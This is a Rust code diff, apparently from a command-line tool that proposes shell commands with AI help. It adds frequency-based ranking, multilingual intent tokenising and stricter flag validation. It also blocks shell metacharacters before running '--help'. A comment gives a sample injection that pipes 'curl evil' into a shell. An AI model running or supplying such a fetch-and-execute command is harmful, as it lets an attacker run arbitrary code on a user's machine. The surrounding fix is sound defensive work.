@@ -9,7 +9,7 @@ use super::{AskInput, Candidate, ExplainInput, ParamSpecDoc, Proposal, ProposalS
 use crate::config::ProviderProfile;
 use crate::framework::{Context, Evolution, Metrics};
 use crate::knowledge::{cache_knowledge, lookup_knowledge, CommandRef, KnowledgeAck};
-use crate::ports::{AiRequest, LlmResponse, ProcessSpec};
+use crate::ports::{AiRequest, LlmResponse, ProcessSpec, QueryRows, SqlQuery, SqlValue};
 use crate::session::store::{
     append_event, events_since_separator, get_or_create_current, pinned_notes, AppendEventInput,
     RecordAck,
@@ -58,6 +58,9 @@ pub fn handle_ask(
         knowledge.is_some(),
         platform,
         &inject,
+        context,
+        metrics,
+        evolution,
     );
     persist_proposal(&mut proposal, &session.id, context, metrics, evolution);
     *output = proposal;
@@ -153,6 +156,7 @@ fn persist_proposal(
 }
 
 /// 提案组装：多候选排序（惯例>低风险>频率，Q23）截断 3 + context_json 快照（Q20）。
+#[allow(clippy::too_many_arguments)]
 fn assemble_proposal(
     input: &AskInput,
     session_id: &str,
@@ -160,19 +164,23 @@ fn assemble_proposal(
     verified: bool,
     platform: Platform,
     inject: &InjectContext,
+    context: &Context,
+    metrics: &mut Metrics,
+    evolution: &mut Evolution,
 ) -> Proposal {
-    // 排序：惯例优先，其次低风险；频率（方案库使用计数）作为第三键
-    for c in &mut parsed.candidates {
-        c.explanation.summary = if c.summary.is_empty() {
-            c.explanation.summary.clone()
-        } else {
-            c.summary.clone()
-        };
-    }
+    // 排序（Q23）：惯例优先 > 低风险 > 历史使用频率（同命令执行次数，尽力而为）
+    let commands: Vec<String> = parsed
+        .candidates
+        .iter()
+        .map(|c| c.command.clone())
+        .collect();
+    let freq = command_frequency(&commands, context, metrics, evolution);
+    let freq_of = |c: &Candidate| freq.get(&c.command).copied().unwrap_or(0);
     parsed.candidates.sort_by(|a, b| {
         b.conventional
             .cmp(&a.conventional)
             .then(a.risk_level.cmp(&b.risk_level))
+            .then(freq_of(b).cmp(&freq_of(a)))
     });
     parsed.candidates.truncate(3);
     Proposal {
@@ -187,6 +195,42 @@ fn assemble_proposal(
         created_at: crate::session::now_ms(),
         context_json: Some(serde_json::to_string(inject).unwrap_or_default()),
     }
+}
+
+/// 历史使用频率（Q23 第三排序键）：同命令历史执行次数（参数化 GROUP BY，失败按 0 不阻断）。
+fn command_frequency(
+    commands: &[String],
+    context: &Context,
+    metrics: &mut Metrics,
+    evolution: &mut Evolution,
+) -> std::collections::HashMap<String, u64> {
+    let mut map = std::collections::HashMap::new();
+    if commands.is_empty() {
+        return map;
+    }
+    let placeholders: Vec<String> = (1..=commands.len()).map(|i| format!("?{i}")).collect();
+    let q = SqlQuery {
+        sql: format!(
+            "SELECT command, COUNT(*) AS c FROM executions WHERE command IN ({}) GROUP BY command",
+            placeholders.join(", ")
+        ),
+        params: commands.iter().map(|c| SqlValue::Text(c.clone())).collect(),
+    };
+    let mut rows = QueryRows::default();
+    if !context
+        .deps
+        .store
+        .storage_query(&q, &mut rows, context, metrics, evolution)
+    {
+        evolution.ok = true; // 频率尽力而为
+        return map;
+    }
+    for i in 0..rows.len() {
+        if let (Some(cmd), Some(n)) = (rows.text(i, "command"), rows.int(i, "c")) {
+            map.insert(cmd.to_string(), n as u64);
+        }
+    }
+    map
 }
 
 /// 生成并校验候选（handle_ask 子步骤）：AI 生成（重试 1 次）+ grounding 参数拒绝。
@@ -291,6 +335,11 @@ pub fn handle_explain(
         return build_explain_doc(&k, output, context, metrics, evolution);
     }
     let Some(knowledge) = knowledge_from_help(input, platform, context, metrics, evolution) else {
+        // 元字符拒绝等安全硬失败直接终止；--help 不可得（解析失败）才走 AI 兜底
+        if evolution.reason_code.as_deref() == Some(crate::error::codes::INTENT_INVALID) {
+            evolution.propagate("handle_explain", "explain 输入被安全策略拒绝");
+            return false;
+        }
         return ai_explain_fallback(input, platform, context, metrics, evolution, output);
     };
     let mut ack = KnowledgeAck::default();
@@ -309,8 +358,19 @@ fn knowledge_from_help(
     metrics: &mut Metrics,
     evolution: &mut Evolution,
 ) -> Option<crate::knowledge::CommandKnowledge> {
+    // 安全边界（AC-02）：explain 只抓取单条命令的 --help 输出。
+    // 输入串经 RealProcess 的 `sh -c` 执行，元字符注入即无闸门任意执行
+    // （如 `iac explain "x; curl evil|sh"`），故先验拒绝。
+    const META: &[char] = &[';', '|', '&', '$', '`', '\n', '\r', '>', '<', '(', ')'];
+    if input.command.contains(META) {
+        evolution.fail(
+            crate::error::codes::INTENT_INVALID,
+            "explain 仅支持单条命令（不得包含 ; | & $ ` > < 括号等 shell 元字符）",
+        );
+        return None;
+    }
     let spec = ProcessSpec {
-        command: format!("{} --help", input.command),
+        command: format!("{} --help", input.command.trim()),
         cwd: None,
         env: vec![],
         timeout_ms: 5_000,
@@ -454,7 +514,8 @@ fn ensure_ask_session(
     true
 }
 
-/// 意图首词作为命令候选查知识（查不到不影响主流程）。
+/// 意图命令候选查知识（查不到不影响主流程）：空格/中文标点切分后取前 5 个
+/// token 依次尝试（中文短语按标点切；命中即短路）。
 fn lookup_for_ask(
     input: &AskInput,
     platform: Platform,
@@ -462,21 +523,32 @@ fn lookup_for_ask(
     metrics: &mut Metrics,
     evolution: &mut Evolution,
 ) -> Option<crate::knowledge::CommandKnowledge> {
-    let first = input.intent.split_whitespace().next().unwrap_or_default();
-    if first.is_empty() {
-        return None;
+    let tokens: Vec<&str> = input
+        .intent
+        .split(|c: char| c.is_whitespace() || "，。！？、：；（）【】,.!?;:()".contains(c))
+        .map(str::trim)
+        .filter(|t| !t.is_empty() && t.chars().count() <= 32)
+        .take(5)
+        .collect();
+    for token in tokens {
+        let cref = CommandRef {
+            command: token.to_string(),
+            platform,
+            source_hash: None,
+        };
+        let mut found = None;
+        let _ = lookup_knowledge(&cref, &mut found, context, metrics, evolution);
+        if found.is_some() {
+            return found;
+        }
     }
-    let cref = CommandRef {
-        command: first.to_string(),
-        platform,
-        source_hash: None,
-    };
-    let mut found = None;
-    let _ = lookup_knowledge(&cref, &mut found, context, metrics, evolution);
-    found
+    None
 }
 
-/// grounding 校验：知识命中时，提案参数必须为已注册参数子集（AC-01 可信来源）。
+/// grounding 校验（AC-01 可信来源）：知识命中时，
+/// ① 候选实际命令 argv（引号感知分词，Q17）中的长旗标必须为已注册参数子集；
+/// ② AI 自报 explanation.params 同样不得越界。
+/// 只校验可命名的长旗标（--x）；短旗标簇/位置参数交由静态风险与执行闸门兜底。
 fn violates_known_params(
     candidates: &[Candidate],
     knowledge: &crate::knowledge::CommandKnowledge,
@@ -484,11 +556,17 @@ fn violates_known_params(
     if knowledge.params.is_empty() {
         return false;
     }
+    let known = |flag: &str| knowledge.params.iter().any(|k| k.flag == flag);
     candidates.iter().any(|c| {
-        c.explanation
-            .params
+        c.argv
             .iter()
-            .any(|p| !knowledge.params.iter().any(|k| k.flag == p.flag))
+            .skip(1)
+            .filter(|a| a.starts_with("--"))
+            .any(|a| {
+                let flag = a.split('=').next().unwrap_or(a);
+                !known(flag)
+            })
+            || c.explanation.params.iter().any(|p| !known(&p.flag))
     })
 }
 
@@ -507,6 +585,7 @@ pub fn default_provider(config: &crate::config::Config) -> ProviderProfile {
             api_key_env: None,
             model: Some("local".into()),
             path: None,
+            max_tokens: None,
         })
 }
 
